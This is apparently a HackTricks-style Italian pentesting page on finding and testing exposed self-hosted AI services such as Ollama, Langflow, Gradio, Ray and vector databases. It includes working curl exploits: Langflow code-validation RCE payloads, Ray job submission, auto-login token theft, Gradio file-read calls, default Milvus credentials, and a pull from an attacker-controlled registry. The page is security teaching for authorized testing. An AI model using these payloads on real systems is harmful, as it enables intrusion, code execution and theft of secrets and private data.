# Servizi AI self-hosted esposti

{{#include ../banners/hacktricks-training.md}}

I team che sviluppano funzionalità AI spesso eseguono autonomamente runner di modelli, builder di agenti, UI demo, cluster di calcolo e database vettoriali. Molti di questi strumenti sono stati progettati per un laptop o una rete di laboratorio chiusa, quindi **non hanno autenticazione predefinita** oppure includono una scorciatoia per l’autenticazione abilitata. Quando un servizio di questo tipo è raggiungibile dall’attaccante, l’impatto rientra di solito in uno di questi gruppi:

- Uso gratuito di GPU e modelli, e furto di modelli privati.
- Fuoriuscita di prompt, documenti ed embedding.
- Fuoriuscita di segreti dall’ambiente del processo (chiavi dei provider LLM, credenziali cloud).
- Esecuzione di codice, perché alcune di queste API eseguono codice **come funzionalità**.

Questa pagina descrive come individuare questi servizi e cosa testare per ciascun tipo di API. Per mettere in sicurezza un server di inferenza self-hosted e il leak di llama.cpp `/slots`, consulta [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Per i file di modello malevoli, consulta [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Invia queste richieste senza credenziali. Una risposta JSON con i campi previsti identifica il prodotto e spesso anche la versione, permettendo di capire quali controlli descritti di seguito siano applicabili. Le porte sono quelle predefinite documentate oppure quelle utilizzate negli esempi ufficiali di esecuzione.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Prodotto | Porta comune | Richiesta non autenticata | Elemento identificativo |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON con la versione, elenco dei modelli locali |
| Langflow | 7860 | `GET /api/v1/version` | JSON con la versione di Langflow |
| Gradio | 7860 | `GET /config` | Configurazione dell’app con la versione di Gradio e gli ID dei componenti |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, elenco dei job inviati |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Valore heartbeat, versione di Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Versione di Qdrant, elenco delle collection |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Versione di Weaviate, classi |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Elenco delle collection oppure errore di autenticazione |

Questi servizi sono spesso pubblicati anche dietro un reverse proxy con un prefisso di percorso (per esempio `/ollama/` o `/ray/`), quindi ripeti le richieste sotto qualsiasi prefisso individuato nei bundle JavaScript o nella documentazione delle API.

## API di inferenza e gestione dei modelli non autenticate

I runner di modelli espongono di solito una singola API REST che combina endpoint di inferenza ed endpoint amministrativi. Ollama ne è un buon esempio. Non dispone di autenticazione integrata e, per impostazione predefinita, si lega a `127.0.0.1:11434`, mentre `OLLAMA_HOST` modifica l’indirizzo di binding.<sup>[[1]](#references)[[15]](#references)</sup> L’immagine Docker ufficiale imposta `OLLAMA_HOST=0.0.0.0:11434` all’interno del container, dichiara `EXPOSE 11434` e non contiene alcuna istruzione `USER`, quindi il server viene eseguito come root nel container.<sup>[[16]](#references)</sup> `EXPOSE` non pubblica la porta sull’host, quindi la raggiungibilità dall’host dipende dalla configurazione del deployment. I comandi `docker run` documentati usano `-p 11434:11434`, e Docker pubblica una mappatura di questo tipo su tutte le interfacce dell’host, a meno che non venga specificato un IP host.<sup>[[17]](#references)[[18]](#references)</sup>

Cosa consentono a un attaccante i diversi gruppi di endpoint:<sup>[[2]](#references)</sup>

| Endpoint | Impatto se non autenticati |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Elenco dei modelli locali e caricati, compresi i modelli personalizzati privati |
| `POST /api/show` | Dettagli del modello, compresi Modelfile, template e **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Inferenza gratuita sull’hardware della vittima |
| `POST /api/pull`, `/api/push` | Far scaricare al server da un registry scelto dall’attaccante o caricarvi un modello |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Creare, sovrascrivere o eliminare modelli |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Un elenco di modelli restituito senza credenziali dimostra già l'esposizione. I modelli personalizzati spesso contengono un prompt di sistema interno in `/api/show`. Un pull verso il tuo host dimostra che il server recupera manifest da registry scelti dall'attaccante. Un `/api/push` verso il tuo registry trasforma l'esposizione in furto del modello. Non chiamare le route di creazione o eliminazione su target reali.

Anche i pull dai registry costituiscono una superficie d'attacco per il parser, perché il server memorizza i blob usando valori provenienti dal manifest remoto. In Probllama (CVE-2024-37032, corretta in Ollama 0.1.34), il `digest` del manifest veniva usato come nome di file senza essere convalidato. Un registry malevolo poteva quindi scrivere file al di fuori della directory dei blob usando sequenze `../`. Eseguire il push di un manifest preparato ad hoc, il cui digest puntava a un file locale, ne causava la divulgazione al registry dell'attaccante. Wiz ha ottenuto RCE in Docker, dove il server viene eseguito come root, scrivendo una libreria condivisa e aggiungendola a `/etc/ld.so.preload`, quindi chiamando `/api/chat` affinché un nuovo processo la caricasse.<sup>[[15]](#references)</sup> Quando un runner può eseguire pull da registry arbitrari, verifica come converte i campi del manifest in percorsi.

## API progettate per eseguire codice

### API di invio dei job

I framework di calcolo distribuito considerano l'esecuzione di codice la loro funzione principale. La Ray Jobs API sulla porta della dashboard (8265) accetta un comando shell `entrypoint` e lo esegue sul cluster.<sup>[[19]](#references)</sup> La ricerca Oligo ShadowRay riferisce che la Jobs API non dispone di autorizzazione e che la dashboard si associa a `0.0.0.0`. Il CVE-2023-48022 corrispondente è contestato perché Ray è pensato per essere eseguito solo all'interno di una rete controllata.<sup>[[20]](#references)</sup> Ray ha aggiunto l'autenticazione facoltativa tramite token (`RAY_AUTH_MODE=token`) nella versione 2.52.0. Ray 2.59 la abilita per impostazione predefinita per i cluster locali avviati con `ray.init()`; `ray start --head` può comunque avviarsi senza autenticazione se non è disponibile un token. Ray documenta un'implementazione più ampia dell'autenticazione predefinita per la versione 2.61, quindi verifica la versione distribuita e la modalità di avvio, invece di presumere che la dashboard sia aperta.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashboard di questo tipo hanno anche route helper che vale la pena sondare nelle versioni meno recenti. Prima di Ray 2.8.1, `/log_proxy?url=` recuperava qualsiasi URL HTTP(S) (SSRF ai metadati cloud) e `/api/v0/logs/file` accettava un percorso `filename` arbitrario, entrambi senza autenticazione.<sup>[[8]](#references)</sup>

### Endpoint di "validazione" del codice che eseguono definizioni di funzioni

I builder di agenti che accettano componenti Python personalizzati a volte "validano" il codice analizzandolo con `ast` ed eseguendo solo le definizioni di funzioni con `exec()`. Non è sicuro. Python valuta **i decorator e i valori predefiniti degli argomenti quando definisce la funzione**, quindi il codice inserito lì viene eseguito anche se il corpo della funzione non viene mai eseguito. `POST /api/v1/validate/code` di Langflow funzionava in questo modo e non richiedeva autenticazione prima della versione 1.3.0 (CVE-2025-3248). Sollevare un'eccezione che contiene l'output del comando fa sì che l'endpoint restituisca l'output nella risposta:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Testa qualsiasi endpoint che compili, esegua il linting o «controlli» il codice dell'utente per verificare la presenza di questo pattern e, come prova, preferisci un callback DNS.

### Route di Auto-login e token predefinito del superuser

Gli strumenti per singolo utente spesso includono una scorciatoia che effettua il login di ogni visitatore come amministratore. In Langflow, quando `AUTO_LOGIN` è abilitato, `GET /api/v1/auto_login` restituisce i token del superuser predefinito a qualsiasi chiamante. Quando è disabilitato, la route risponde `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS dalla versione 1.0.0 alla 1.10.0 lo abilitava per impostazione predefinita (CVE-2026-9103). Combinandolo con la route autenticata di convalida del codice descritta sopra, si ripristina una RCE non autenticata (CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> Le versioni ufficiali attuali e le immagini Docker disabilitano il login automatico e richiedono una password per il superuser, ma i branch di sviluppo lo mantengono abilitato.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Anche senza code execution, un token superuser dà accesso a tutti i flow e alle credenziali provider archiviate. Per un controllo prerequisito correlato nei test automatizzati, vedi [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Route di file serving e RPC nelle UI demo ML

I framework per demo ML servono i file caricati e generati tramite una route generica e consentono al frontend di chiamare helper dei componenti lato server. Gradio espone `/config`, `/upload` e `/file=<path>` per questo.<sup>[[5]](#references)</sup> Su qualsiasi framework simile, vale la pena testare due pattern:

- **Traversal da una sottodirectory di upload:** se la route dei file controlla solo che il path inizi all'interno della cartella temporanea, carica un file per creare una sottodirectory, poi risali la gerarchia con `../` o `%2e%2e%2f`. Gradio dalla versione 4.0 alla 4.10 (CVE-2023-51449) era vulnerabile in questo modo.<sup>[[26]](#references)[[27]](#references)</sup> Invia la richiesta con `curl --path-as-is` affinché il client non normalizzi il path.
- **Dispatch arbitrario dei metodi:** un endpoint che chiama `getattr(component, fn_name)` con input dell'utente consente all'attaccante di chiamare helper interni. Prima della versione 4.13.0, l'endpoint `/component_server` di Gradio faceva questo. Nelle versioni dalla 4.3 alla 4.12, `move_resource_to_block_cache` copiava qualsiasi file locale nella cache, da cui era possibile scaricarlo tramite `/file=`. Nelle versioni dalla 3.47 alla 3.50.2, altri helper consentivano la lettura di file e un SSRF con lettura completa.<sup>[[26]](#references)[[28]](#references)</sup> Un server corretto risponde `Function not found.` per gli helper non contrassegnati come funzioni server.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Su Hugging Face Spaces, i secret dello Space sono variabili d’ambiente, quindi `/proc/self/environ` è il file più prezioso. Horizon3 lo ha letto con un header HTTP `Range`.<sup>[[26]](#references)</sup>

## Database vettoriali usati da RAG

RAG archivia chunk dei documenti originali, i relativi embedding e i metadati in un database vettoriale, e l’assistente inserisce i risultati migliori nel proprio prompt. L’accesso in lettura causa quindi il leak del **testo in chiaro di documenti privati**. L’accesso in scrittura consente a un attaccante di inserire chunk che verranno recuperati in seguito nei prompt di altri utenti, causando una persistent indirect prompt injection (vedi [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Per i database vettoriali self-hosted, verifica se è configurata l’autenticazione o se è abilitato l’accesso anonimo:

- **Qdrant**: le istanze distribuite autonomamente sono in ascolto su tutte le interfacce senza autenticazione. Se configurata, la chiave va nell’header `api-key` o in `Authorization: Bearer`. Possono esistere chiavi di sola lettura e per singola collection.<sup>[[11]](#references)</sup>
- **Chroma**: l’autenticazione è disabilitata per impostazione predefinita. L’autenticazione tramite token usa `Authorization` o `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: quando è abilitato l’accesso anonimo, le richieste senza credenziali vengono autenticate come `user: anonymous` e ottengono i permessi assegnati a quell’utente.<sup>[[30]](#references)</sup>
- **Milvus**: l’autenticazione è disattivata, a meno che `common.security.authorizationEnabled` non sia `true`. Quando è attiva, l’utente predefinito `root` ha la password `Milvus` e il formato del token è `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Una risposta che contiene dati privati senza credenziali indica un’esposizione. Se l’autenticazione è abilitata, verifica separatamente l’eventuale presenza di account predefiniti non modificati:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Verifica se i payload contengono testo di documenti, identificativi utente o nomi di tenant. Per dimostrare l'accesso in scrittura senza contaminare i dati di produzione, crea ed elimina immediatamente una collection vuota e chiaramente identificabile, e fallo solo se lo scope lo consente.

Anche su questi server l'autenticazione può arrivare troppo tardi. Nel server Python FastAPI di Chroma (dalla versione 1.0.0 almeno fino alla 1.5.8, CVE-2026-45829), la route di creazione delle collection costruiva la funzione di embedding fornita dal client prima del controllo di autenticazione. Una configurazione che faceva riferimento a un modello Hugging Face controllato da un attacker con `trust_remote_code: true` eseguiva il codice dell'attacker anche quando la richiesta veniva rifiutata. Il frontend Rust non era interessato.<sup>[[32]](#references)</sup> Quando una richiesta include configurazioni di modelli o plugin, testala senza credenziali e verifica se viene effettuata una richiesta in uscita verso il repository del modello.

## References

- [1] [FAQ di Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Documentazione API di Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README di Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Codice sorgente di Langflow - endpoint API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Codice sorgente di Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Codice sorgente di Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Codice sorgente di Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, versioni 2.6.3 e 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Codice sorgente di Chroma - valori predefiniti del client Python](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Codice sorgente di Chroma - route del server FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Sicurezza](https://qdrant.tech/documentation/security/)
- [12] [Specifiche OpenAPI di Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Specifiche OpenAPI di Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Connessione al server Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: vulnerabilità di Remote Code Execution in Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile di Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Documentazione Docker di Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Pubblicazione ed esposizione delle porte](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [API REST di Ray Jobs](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: la prima campagna di attacco nota contro i workload AI, sfruttata attivamente in-the-wild](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Autenticazione tramite token di Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Insicuro a qualsiasi velocità: abuso di Python Exec per ottenere RCE non autenticata in Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Codice sorgente di Langflow - router di login](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Sfruttare le vulnerabilità di lettura dei file in Gradio per sottrarre segreti dagli Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Avviso di sicurezza di Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit di correzione di Gradio per `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Autenticazione nativa di Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Autenticazione](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Autenticare l'accesso degli utenti](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast servito prima dell'autenticazione](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
